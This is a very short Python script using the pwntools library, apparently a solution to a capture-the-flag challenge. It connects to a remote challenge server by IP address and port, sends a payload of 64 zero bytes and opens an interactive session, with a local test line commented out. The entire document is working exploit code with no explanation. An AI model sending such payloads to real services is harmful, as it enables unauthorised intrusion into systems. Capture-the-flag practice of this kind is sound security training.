from pwn import *

#s = process('./chall')
s = remote('34.146.101.4', 30007)

s.sendline(p64(0) * 8)

s.interactive()
